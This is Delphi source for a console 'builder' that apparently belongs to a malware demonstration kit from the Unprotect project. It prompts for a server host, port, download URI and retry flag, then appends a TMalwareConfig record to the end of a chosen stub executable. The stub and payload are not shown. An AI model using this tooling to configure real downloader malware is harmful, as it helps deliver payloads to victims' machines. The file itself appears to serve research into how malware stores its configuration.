{******************************************************************************}
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://www.unprotect.it/                                  }
{                   https://github.com/Unprotect-Project                       }
{                   https://github.com/darkcodersc                             }
{                   https://github.com/PhrozenIO                               }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{******************************************************************************}

program builder;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  Winapi.Windows,
  Winapi.CommDlg,
  System.SysUtils,
  uExceptions in '..\Shared\uExceptions.pas',
  uPayload in '..\Shared\uPayload.pas';

(* Local Functions (Helpers) *)

function PromptQuestion(const AQuestion: String; const AMaxLen : Cardinal = 255) : String;
var ACandidate : String;
begin
  while True do begin
    Write(Format('%s? : ', [AQuestion]));

    ReadLn(ACandidate);

    if Length(ACandidate) > AMAxLen then
      WriteLn(Format('[x] Answer length is limited to a maximum of %d characters', [AMaxLen]))
    else
      break;
  end;

  result := ACandidate;
end;

function PromptQuestion_Bool(const AQuestion: String) : Boolean;
var ACandidate : String;
    AResult    : Boolean;
    ACompare   : Integer;
begin
  while True do begin
    ACandidate := PromptQuestion(AQuestion, 5 { False Max Length });
    ///

    if String.Compare(ACandidate, 'True', True) = 0 then
      AResult := True
    else if String.Compare(ACandidate, 'False', True) = 0 then
      AResult := False
    else begin
      WriteLn('[x] Please answer "True" or "False".');

      continue;
    end;

    ///
    break;
  end;

  result := AResult;
end;

function PromptQuestion_Word(const AQuestion: String) : Word;
var ACandidate : String;
    AInteger   : Integer;
begin
  while True do begin
    ACandidate := PromptQuestion(AQuestion, 5 { Word Max Length });

    try
      if not TryStrToInt(ACandidate, AInteger) then
        raise Exception.Create('Answer must be a valid number.');

      if (AInteger < low(Word)) or (AInteger > high(Word)) then
        raise Exception.Create(
          Format('Answered number must be between %d and %d.', [
            low(Word),
            high(Word)
          ])
        );

      ///
      break;
    except
      on E : Exception do
        WriteLn(Format('[x] %s', [E.Message]));
    end;
  end;

  result := AInteger;
end;

(* Entry Point *)

var AOpenFileName : OPENFILENAMEW;
    AFileName     : array [0..MAX_PATH-1] of WideChar;
    hFile         : THandle;
    AConfig       : TMalwareConfig;
    ABytesWritten : DWORD;

begin
  try
    { Gather Target File Location (Stub File) using Microsoft Native Open Dialog }
    ZeroMemory(@AOpenFileName, SizeOf(OPENFILENAMEW));

    // https://learn.microsoft.com/en-us/windows/win32/api/commdlg/ns-commdlg-openfilenamew?WT_mc_id=SEC-MVP-5005282
    AOpenFileName.lStructSize := SizeOf(OPENFILENAMEW);
    AOpenFileName.hWndOwner := 0;
    AOpenFileName.Flags := (OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST);
    AOpenFileName.lpstrFile := @AFileName;
    AOpenFileName.nMaxFile := MAX_PATH;

    // https://learn.microsoft.com/en-us/windows/win32/api/commdlg/nf-commdlg-getopenfilenamew?WT_mc_id=SEC-MVP-5005282
    if not GetOpenFileNameW(AOpenFileName) then
      ExitProcess(1);

    WriteLn(Format('Working on [%s] stub.', [AFileName]));

    WriteLn('Open Handle...');

    { Get an handle to file with correct permissions }
    // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew?WT_mc_id=SEC-MVP-5005282
    hFile := CreateFileW(
      @AFileName,
      GENERIC_WRITE,
      0,
      nil,
      OPEN_EXISTING,
      FILE_ATTRIBUTE_NORMAL,
      0
    );
    if hFile = INVALID_HANDLE_VALUE then
      raise EWindowsException.Create('CreateFileW');

    WriteLn(Format('File handle: [%x]', [hFile]));

    { Prepare Config Payload }
    ZeroMemory(@AConfig, SizeOf(TMalwareConfig));
    AConfig.Magic := MAGIC_NUMBER;
    AConfig.Host := PromptQuestion('Please enter server host', High(AConfig.Host));
    AConfig.Port := PromptQuestion_Word('Please enter server port');
    AConfig.FileNameURI := PromptQuestion('Please enter http server file name URI', High(AConfig.Host));
    AConfig.RetryIfFail := PromptQuestion_Bool('Retry if download fails');

    WriteLn('Moving file cursor to the end...');


    { Place file cursor at the end }
    // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointer?WT_mc_id=SEC-MVP-5005282
    if SetFilePointer(hFile, 0, nil, FILE_END) = $FFFFFFFF {INVALID_SET_FILE_POINTER} then
      raise EWindowsException.Create('SetFilePointer');

    WriteLn('Writting changes...');

    { Write Config to target stub EOF }
    // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile?WT_mc_id=SEC-MVP-5005282
    if not WriteFile(hFile, AConfig, SizeOf(TMalwareConfig), ABytesWritten, nil) then
      raise EWindowsException.Create('WriteFile');

    WriteLn(Format('%d bytes written to file.', [ABytesWritten]));

    WriteLn('Done');

    ///
    WriteLn('Press return key to exit.');
    readln;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.



